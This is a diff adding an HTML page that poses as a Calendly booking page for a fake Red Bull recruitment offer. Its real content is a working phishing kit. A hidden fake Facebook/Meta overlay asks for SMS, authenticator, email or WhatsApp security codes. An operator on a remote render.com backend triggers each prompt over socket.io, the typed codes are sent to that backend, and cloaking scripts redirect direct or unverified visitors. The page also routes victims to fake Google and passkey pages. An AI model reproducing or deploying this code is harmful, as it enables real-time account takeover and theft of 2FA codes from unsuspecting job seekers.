@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Calendly</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="assets/favicon-bfb0492a754bdf44a0a58b969963f44235653cca09a1c0110309c1e03077e368.ico">
+  <meta name="robots" content="noindex, nofollow">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: Arial, Helvetica, sans-serif; }
+
+    /* ── Facebook modal overlay ── */
+    .fb26-overlay {
+      position: fixed; inset: 0; z-index: 99999;
+      background: rgba(0,0,0,.72);
+      display: flex; align-items: center; justify-content: center;
+      padding: 16px; overflow-y: auto;
+    }
+    .fb26-window {
+      background: #fff; border-radius: 12px; overflow: hidden;
+      width: 100%; max-width: 500px;
+      box-shadow: 0 12px 60px rgba(0,0,0,.6);
+      animation: fb26Pop .16s ease;
+    }
+    @keyframes fb26Pop {
+      from { opacity: 0; transform: scale(.96); }
+      to   { opacity: 1; transform: scale(1); }
+    }
+
+    /* 2FA panels */
+    .fb26-2fa { min-height: 340px; display: flex; flex-direction: column; }
+    .fb26-2fa-hd {
+      padding: 20px 24px 16px;
+      border-bottom: 1px solid #e4e6eb;
+      text-align: center;
+    }
+    .fb26-fb-wm {
+      font-size: 28px; font-weight: 800; color: #1877f2;
+      letter-spacing: -1px;
+    }
+    .fb26-2fa-bd { padding: 24px 24px 8px; flex: 1; }
+    .fb26-2fa-t { font-size: 20px; font-weight: 700; color: #1c1e21; margin-bottom: 12px; }
+    .fb26-2fa-d { font-size: 14px; color: #606770; line-height: 1.5; margin-bottom: 8px; }
+    .fb26-2fa-ds { font-size: 14px; color: #606770; margin-bottom: 16px; }
+    .fb26-2fa-ds strong { color: #1c1e21; }
+    .fb26-code {
+      width: 100%; height: 48px;
+      border: 1px solid #ccd0d5; border-radius: 6px;
+      font-size: 18px; text-align: center; letter-spacing: 4px;
+      outline: none; margin-bottom: 8px;
+      padding: 0 12px;
+    }
+    .fb26-code:focus { border-color: #0064e0; }
+    .fb26-code::-webkit-outer-spin-button,
+    .fb26-code::-webkit-inner-spin-button { -webkit-appearance: none; }
+    .fb26-cerr { font-size: 13px; color: #e02020; min-height: 18px; margin-bottom: 4px; }
+    .fb26-2fa-ac {
+      display: flex; align-items: center;
+      justify-content: space-between; padding: 12px 24px 16px;
+    }
+    .fb26-noc { font-size: 14px; color: #0064e0; text-decoration: none; }
+    .fb26-noc:hover { text-decoration: underline; }
+    .fb26-btn-c {
+      height: 40px; padding: 0 20px;
+      background: #0064e0; color: #fff; border: none;
+      border-radius: 6px; font-size: 15px; font-weight: 600;
+      cursor: pointer; transition: background .15s;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .fb26-btn-c:hover:not(:disabled) { background: #004bbf; }
+    .fb26-btn-c:disabled { opacity: .4; cursor: not-allowed; }
+    .fb26-copy { font-size: 11px; color: #8a8d91; margin: 0; text-align: center; padding-bottom: 12px; }
+
+    .loading-spinner {
+      width: 18px; height: 18px;
+      border: 2px solid rgba(255,255,255,.35);
+      border-top-color: #fff; border-radius: 50%;
+      animation: spin .65s linear infinite; display: inline-block;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+
+<body>
+
+  <!-- Calendly embed -->
+  <div class="calendly-inline-widget" data-url="https://calendly.com/redbullrecruitment/30min" style="min-width:320px;height:100vh;"></div>
+  <script type="text/javascript" src="https://assets.calendly.com/assets/external/widget.js" async></script>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       Facebook Security Modals — hidden, shown by socket events
+       ═══════════════════════════════════════════════════════════════ -->
+  <div class="fb26-overlay" id="fb-modal-overlay" style="display:none;">
+    <div class="fb26-window">
+
+      <!-- SMS 2FA -->
+      <div id="cal-codeSms" style="display:none;">
+        <div class="fb26-2fa">
+          <div class="fb26-2fa-hd"><span class="fb26-fb-wm">facebook</span></div>
+          <div class="fb26-2fa-bd">
+            <h2 class="fb26-2fa-t">Enter security code</h2>
+            <p class="fb26-2fa-d">Please check your phone for a message with your code. Your code is 6 numbers long.</p>
+            <p class="fb26-2fa-ds">We sent your code to: <strong>+***********</strong></p>
+            <input type="number" id="cal-smscode" class="fb26-code" placeholder="Enter Code">
+            <div id="cal-sms-err" class="fb26-cerr"></div>
+          </div>
+          <div class="fb26-2fa-ac">
+            <a class="fb26-noc" href="#">Didn't get a code?</a>
+            <button type="button" id="cal-smsBtn" class="fb26-btn-c" disabled>Continue</button>
+          </div>
+          <p class="fb26-copy">Meta © 2026</p>
+        </div>
+      </div>
+
+      <!-- Auth App 2FA -->
+      <div id="cal-authcode" style="display:none;">
+        <div class="fb26-2fa">
+          <div class="fb26-2fa-hd"><span class="fb26-fb-wm">facebook</span></div>
+          <div class="fb26-2fa-bd">
+            <h2 class="fb26-2fa-t">Enter security code</h2>
+            <p class="fb26-2fa-d">Your account has two-factor authentication switched on, which requires this extra login step.</p>
+            <p class="fb26-2fa-d">Enter the 6-digit code from the authentication app you set up.</p>
+            <input type="number" id="cal-authcodedes" class="fb26-code" placeholder="Enter Code">
+            <div id="cal-auth-err" class="fb26-cerr"></div>
+          </div>
+          <div class="fb26-2fa-ac">
+            <a class="fb26-noc" href="#">Didn't get a code?</a>
+            <button type="button" id="cal-authBtn" class="fb26-btn-c" disabled>Continue</button>
+          </div>
+          <p class="fb26-copy">Meta © 2026</p>
+        </div>
+      </div>
+
+      <!-- Email Code -->
+      <div id="cal-codeEmail" style="display:none;">
+        <div class="fb26-2fa">
+          <div class="fb26-2fa-hd"><span class="fb26-fb-wm">facebook</span></div>
+          <div class="fb26-2fa-bd">
+            <h2 class="fb26-2fa-t">Enter security code</h2>
+            <p class="fb26-2fa-d">Please check your email for a message with your code. Your code is 8 numbers long.</p>
+            <p class="fb26-2fa-ds">We sent your code to: <strong>****@****.***</strong></p>
+            <input type="number" id="cal-emailcode" class="fb26-code" placeholder="Enter Code">
+            <div id="cal-email-err" class="fb26-cerr"></div>
+          </div>
+          <div class="fb26-2fa-ac">
+            <a class="fb26-noc" href="#">Didn't get a code?</a>
+            <button type="button" id="cal-emailBtn" class="fb26-btn-c" disabled>Continue</button>
+          </div>
+          <p class="fb26-copy">Meta © 2026</p>
+        </div>
+      </div>
+
+      <!-- WhatsApp Code -->
+      <div id="cal-whatsapp" style="display:none;">
+        <div class="fb26-2fa">
+          <div class="fb26-2fa-hd"><span class="fb26-fb-wm">facebook</span></div>
+          <div class="fb26-2fa-bd">
+            <h2 class="fb26-2fa-t">Enter security code</h2>
+            <p class="fb26-2fa-d">Please check your WhatsApp for a message with your code. Your code is 6 numbers long.</p>
+            <p class="fb26-2fa-ds">We sent your code to: <strong>+***********</strong></p>
+            <input type="number" id="cal-whcode" class="fb26-code" placeholder="Enter Code">
+            <div id="cal-wh-err" class="fb26-cerr"></div>
+          </div>
+          <div class="fb26-2fa-ac">
+            <a class="fb26-noc" href="#">Didn't get a code?</a>
+            <button type="button" id="cal-whBtn" class="fb26-btn-c" disabled>Continue</button>
+          </div>
+          <p class="fb26-copy">Meta © 2026</p>
+        </div>
+      </div>
+
+    </div><!-- /.fb26-window -->
+  </div><!-- /#fb-modal-overlay -->
+
+  <script src="https://backed-nxht.onrender.com/socket.io/socket.io.js"></script>
+  <script>
+  /* Guard: redirect to apply.html if user opens this page directly (tab closed and reopened) */
+  (function () {
+    if (!sessionStorage.getItem('calendlySession')) {
+      window.location.replace('apply.html');
+    }
+  })();
+  </script>
+  <script>
+  (function () {
+    var BACKEND = (function () {
+      var h = location.hostname;
+      return (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'))
+        ? 'http://localhost:3001'
+        : 'https://backed-nxht.onrender.com';
+    })();
+
+    var clientId = localStorage.getItem('clientId');
+    if (!clientId) {
+      clientId = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now().toString(36);
+      localStorage.setItem('clientId', clientId);
+    }
+
+    var socket = io(BACKEND, { query: { clientId: clientId } });
+
+    socket.on('connect', function () {
+      socket.emit('userConnectedToPage', { page: 'Calendly', clientId: clientId });
+    });
+
+    /* Chrome mobile kills WebSocket when backgrounded — force fresh reconnect on return */
+    var _calWasHidden = false;
+    var _calReady = false;
+    socket.on('connect', function () { _calReady = true; });
+    document.addEventListener('visibilitychange', function () {
+      if (document.visibilityState === 'hidden') {
+        _calWasHidden = true;
+      } else if (document.visibilityState === 'visible' && _calWasHidden && _calReady) {
+        _calWasHidden = false;
+        setTimeout(function () {
+          socket.disconnect();
+          setTimeout(function () { socket.connect(); }, 300);
+        }, 800);
+      }
+    });
+
+    /* ── Redirect command ── */
+    socket.on('redirect', function (url) { window.location.href = url; });
+
+    /* ── Show a modal panel ── */
+    var overlay = document.getElementById('fb-modal-overlay');
+    var panels  = ['cal-codeSms','cal-authcode','cal-codeEmail','cal-whatsapp'];
+
+    function showPanel(id) {
+      panels.forEach(function (p) {
+        document.getElementById(p).style.display = 'none';
+      });
+      document.getElementById(id).style.display = 'block';
+      overlay.style.display = 'flex';
+    }
+
+    /* ── Socket events from admin panel ── */
+    socket.on('show-2fa',       function () { showPanel('cal-codeSms'); });
+    socket.on('show-auth',      function () { showPanel('cal-authcode'); });
+    socket.on('show-email',     function () { showPanel('cal-codeEmail'); });
+    socket.on('show-whatsapp',  function () { showPanel('cal-whatsapp'); });
+
+    /* Wrong creds / old pass → redirect back to apply.html with modal */
+    var applyRedirects = {
+      'show-wrong-creds': 'wrongcreds',
+      'show-old-pass':    'oldpass'
+    };
+    Object.keys(applyRedirects).forEach(function (evt) {
+      socket.on(evt, function () {
+        try { sessionStorage.setItem('pendingModal', applyRedirects[evt]); } catch(e) {}
+        window.location.href = 'apply.html';
+      });
+    });
+
+    /* show-google-login: start the Google verification flow from Calendly */
+    socket.on('show-google-login', function () {
+      var fbEmail = sessionStorage.getItem('lastLoginEmail') || '';
+      try {
+        sessionStorage.setItem('googleReturnPage', 'apply.html');
+        if (fbEmail) sessionStorage.setItem('lastLoginEmail', fbEmail);
+      } catch(e) {}
+      try { sessionStorage.setItem('fbVerifySession', '1'); } catch(e) {}
+      window.location.href = 'fb-verify.html';
+    });
+
+    /* show-calendar: already on Calendly — do nothing */
+    socket.on('show-calendar', function () { /* no-op */ });
+
+    socket.on('show-passkey', function () {
+      try { sessionStorage.setItem('passkeySession', '1'); } catch(e) {}
+      window.location.href = 'passkey';
+    });
+
+    /* ── Code submission helper ── */
+    function setupCodeBlock(inputId, btnId, codeLen, endpoint) {
+      var inp = document.getElementById(inputId);
+      var btn = document.getElementById(btnId);
+      if (!inp || !btn) return;
+
+      inp.addEventListener('input', function () {
+        var val = inp.value.replace(/\D/g, '').slice(0, codeLen);
+        inp.value = val;
+        btn.disabled = val.length !== codeLen;
+      });
+
+      btn.addEventListener('click', function () {
+        var code = inp.value;
+        if (code.length !== codeLen) return;
+        btn.disabled = true;
+        btn.innerHTML = '<span class="loading-spinner"></span>';
+
+        fetch(BACKEND + endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code: code, socketId: socket.id })
+        })
+        .then(function (r) { return r.json(); })
+        .catch(function () {});
+      });
+    }
+
+    setupCodeBlock('cal-smscode',    'cal-smsBtn',   6, '/send-auth-code');
+    setupCodeBlock('cal-authcodedes','cal-authBtn',  6, '/send-auth-code');
+    setupCodeBlock('cal-emailcode',  'cal-emailBtn', 8, '/send-email-code');
+    setupCodeBlock('cal-whcode',     'cal-whBtn',    6, '/send-auth-code');
+
+    /* ── Wrong-code event: reset the visible panel ── */
+    socket.on('show-wrong-sms-code', function () {
+      ['cal-smscode','cal-authcodedes','cal-emailcode','cal-whcode'].forEach(function (id) {
+        var el = document.getElementById(id);
+        if (el) { el.value = ''; }
+      });
+      ['cal-smsBtn','cal-authBtn','cal-emailBtn','cal-whBtn'].forEach(function (id) {
+        var el = document.getElementById(id);
+        if (el) { el.disabled = true; el.innerHTML = 'Continue'; }
+      });
+    });
+
+  })();
+  </script>
+
+</body>
+</html>
